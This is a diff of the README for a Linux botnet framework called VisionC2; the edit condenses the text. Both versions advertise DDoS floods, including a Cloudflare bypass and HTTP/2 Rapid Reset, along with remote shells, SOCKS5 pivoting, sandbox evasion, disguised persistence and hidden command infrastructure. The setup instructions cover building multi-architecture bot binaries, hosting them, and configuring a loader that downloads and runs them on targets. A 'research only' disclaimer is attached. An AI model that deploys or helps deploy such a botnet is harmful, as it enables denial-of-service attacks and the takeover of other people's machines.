@@ -1,10 +1,8 @@
 <div align="center">
 
-# Vision C2 — Advanced Linux Botnet Framework
+# VisionC2
 
-> DDoS, RCE, SOCKS5 pivoting. TLS 1.3 transport.
-> Full AES encryption. Anti-analysis and daemonized persistence.
-> Driven through a websocket-powered Tor web panel or real-time Go TUI.
+> Linux botnet framework with DDoS capabilities, RCE, and SOCKS5 pivoting
 
 [Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=KkIg24KwpB0)
 
@@ -34,80 +32,69 @@
 ---
 
 ## Features
-### 3-Way C2 Interface
-Tor hidden service web panel, Go TUI, or Telnet CLI — use any or all. Tor panel enables full control from any browser with zero clearnet exposure.
 
-### Encrypted Transport
-TLS 1.3 over port 443 — indistinguishable from HTTPS.
+### C2 Interfaces
+Three control options: Tor hidden service web panel, Go TUI, or Telnet CLI. The Tor panel works from any browser without clearnet exposure.
 
-### Layer 4/7 Arsenal
-10 DDoS vectors across L4 and L7. UDP/TCP/SYN/ACK/GRE/DNS volume floods, HTTP/HTTPS request floods, Cloudflare bypass with session fingerprinting, and HTTP/2 Rapid Reset (CVE-2023-44487). Full proxy support on all L7 methods
+### Network Transport
+TLS 1.3 over port 443. SOCKS5 proxy support with multi-relay failover and auto-reconnect. Backconnect relay keeps C2 infrastructure hidden.
 
-### Remote Shell
-Full output capture with Linux shortcuts and post-exploit helpers.
+### Attack Methods
+10 DDoS vectors across L4/L7: UDP/TCP/SYN/ACK/GRE/DNS floods, HTTP/HTTPS request floods, Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487). Proxy support on all L7 methods.
 
-### SOCKS5 Pivoting
-Backconnect relay or direct listener. Multi-relay failover with auto-reconnect. Disposable VPS keeps C2 hidden.
+### Remote Access
+Shell access with full output capture and Linux shortcuts. Post-exploit helpers included.
 
-### Stealth & Obfuscation
-40+ VM/sandbox/debugger signatures checked for at startup. Strings AES-128-CTR encrypted at build time with per-build keys. C2 address decoded via 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Packed with **m30w packer** (custom UPX fork).
+### Evasion
+VM/sandbox detection (40+ signatures), string encryption (AES-128-CTR), obfuscated C2 address (6-layer decoding), custom UPX packing.
 
 ### Persistence
-Triple-layered: systemd + cron watchdog + rc.local. Fork+setsid daemonization with disguised names and PID lock prevents duplicate agents.
+Systemd, cron watchdog, and rc.local. Fork+setsid daemonization with disguised process names and PID lock.
 
 ### Authentication
-HMAC registration via MD5 challenge-response with per-campaign sync tokens. Replay-proof.
+HMAC registration with MD5 challenge-response and per-campaign sync tokens.
 
 ---
 
 ## Architecture
 
-Vision has three components:
+**`cnc/`** — C2 server with dual listeners: TLS on 443 for bot connections, embedded Tor service for web panel. Includes interactive TUI and optional Telnet CLI. RBAC with four permission tiers configured in `users.json`.
 
-**`cnc/`** — Command & Control server. Dual-listener: TLS on 443 for bot connections, plus an embedded Tor hidden service hosting the web panel (WebSocket shell, live SOCKS dashboard, attack launcher, post-exploit shortcuts). Also runs an interactive TUI built with Bubble Tea and an optional Telnet admin CLI. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`. Relay endpoints and proxy credentials baked in at build time via `setup.py`.
+**`bot/`** — Agent binary. Connects over TLS 1.3 after decoding config, daemonizing, checking for sandboxes, installing persistence, and resolving C2 address.
 
-**`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → sandbox detection → singleton lock → install persistence → DNS-resolve C2 → connect with reconnect loop. Pre-configured relay endpoints encrypted into the binary.
-
-**`relay/`** — Backconnect SOCKS5 relay server. Sits between proxy users and bots — bots connect out to the relay via TLS, users connect to the relay's SOCKS5 port. Disposable infrastructure that keeps C2 hidden. Multi-relay failover with auto-reconnect and exponential backoff.
+**`relay/`** — SOCKS5 relay server. Bots connect to relay via TLS, users connect to relay's SOCKS5 port. Disposable infrastructure component.
 
 ---
 
 ## Installation
 
-### Prerequisites
-
+### Dependencies
 ```bash
-sudo apt update && sudo apt install -y openssl git wget gcc python3 screen tor
+# Install requirements
+sudo apt update && apt install -y openssl git wget gcc python3 screen tor
 
-# Go 1.24+
+# Install Go 1.24+
 wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
-sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
-echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
+sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
 ```
 
-| Requirement | Minimum | Recommended |
-|---|---|---|
-| RAM / Storage | 512 MB / 1 GB | 2 GB+ / 5 GB+ |
-| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
-| Network | Port 443 open | + Admin port for split mode |
+**Requirements:** 512MB RAM, 1GB storage, port 443 open  
+**Recommended:** Ubuntu 22.04+, 2GB+ RAM
 
 ### Setup
-
 ```bash
 git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
 python3 setup.py   # Select [1] Full Setup
 ```
 
-The wizard prompts for your **C2 address**, **admin port** (default `420`), and **TLS cert details**. Output:
+The setup wizard prompts for C2 address, admin port (default 420), and TLS cert details. Outputs:
+- `bins/` — 14 bot binaries (multi-arch)
+- `cnc/certificates/` — server.crt + server.key  
+- `server` — CNC binary
+- `setup_config.txt` — Config summary
 
-```
-bins/              → 14 bot binaries (multi-arch)
-cnc/certificates/  → server.crt + server.key
-server             → CNC binary
-setup_config.txt   → Config summary
-```
-
-To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bots afterward.
+To change C2 address later: `python3 setup.py` → option [2]. Redeploy bots afterward.
 
 ---
 
@@ -115,80 +102,65 @@ To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bo
 
 <img width="1178" height="821" alt="image" src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" />
 
-
 ### Starting the CNC
-
 ```bash
-./server              # interactive launcher — pick TUI, Telnet, or both
+./server              # interactive launcher
 ./server --tui        # TUI mode only
 ./server --split      # Telnet mode on port 420
-./server --daemon     # Telnet headless (no TUI)
+./server --daemon     # Telnet headless
 ```
 
-Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).
+Run in background: `screen -S vision ./server` (detach with Ctrl+A, D).
 
-### Serving Binaries
-
-After setup, compiled agents are in `bins/`. Host them with Apache (Seperate VPS) so `loader.sh` can pull the right binary per-arch:
-
+### Deploying Bots
+Host binaries on separate VPS:
 ```bash
 sudo apt install -y apache2
 sudo cp bins/* /var/www/html/bins/
 sudo systemctl start apache2
 ```
 
-Edit `loader.sh` line 3 — replace the URL with your server:
-
+Edit `loader.sh` line 3 with your server IP:
 ```bash
 SRV="http://<your-server-ip>/bins"
 ```
 
-The loader auto-detects the target's architecture, downloads the matching binary, and runs it.
-
-> Full binary map: [`build.sh`](tools/build.sh)
+The loader detects target architecture and downloads the matching binary.
 
 ---
 
 ## Attack Methods
 
-### Layer 4 — Network/Transport
+### Layer 4 (Network/Transport)
+- **UDP Flood** — High-volume 1024-byte payloads
+- **TCP Flood** — Connection table exhaustion  
+- **SYN Flood** — Randomized source ports (raw TCP)
+- **ACK Flood** — ACK packet spam (raw TCP)
+- **GRE Flood** — Protocol 47, max payload
+- **DNS Flood** — Randomized query types, reflection
 
-| Method | Description |
-|---|---|
-| **UDP Flood** | High-volume 1024-byte payload spam |
-| **TCP Flood** | Connection table exhaustion |
-| **SYN Flood** | Randomized source ports (raw TCP) |
-| **ACK Flood** | ACK packet flooding (raw TCP) |
-| **GRE Flood** | GRE protocol 47, max payload |
-| **DNS Flood** | Randomized query types, DNS reflection |
-
-### Layer 7 — Application
-
-| Method | Description |
-|---|---|
-| **HTTP Flood** | GET/POST with randomized headers + user-agents |
-| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
-| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
-| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487), batched HEADERS + RST_STREAM |
-| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |
+### Layer 7 (Application)
+- **HTTP Flood** — GET/POST with randomized headers + user-agents
+- **HTTPS/TLS Flood** — TLS handshake exhaustion + burst requests
+- **CF Bypass** — Cloudflare bypass via session/cookie reuse + fingerprinting
+- **Rapid Reset** — HTTP/2 exploit (CVE-2023-44487), HEADERS + RST_STREAM
+- **Proxy Support** — HTTP + SOCKS5 proxy integration on all L7 methods
 
 ---
 
 ## Documentation
 
-| Doc | Description |
-|---|---|
-| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
-| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history |
-| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
-| [`SETUP.md`](Docs/SETUP.md) | Setup guide |
-| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment |
+- [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) — System architecture details
+- [`CHANGELOG.md`](Docs/CHANGELOG.md) — Version history  
+- [`COMMANDS.md`](Docs/COMMANDS.md) — Command reference
+- [`SETUP.md`](Docs/SETUP.md) — Setup guide
+- [`PROXY.md`](Docs/PROXY.md) — SOCKS5 relay deployment
 
 ---
 
 ## Legal Disclaimer
 
-**For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.
+For authorized security research and educational purposes only. Usage against targets without prior consent is illegal. Developer assumes no liability for misuse.
 
 ---
 
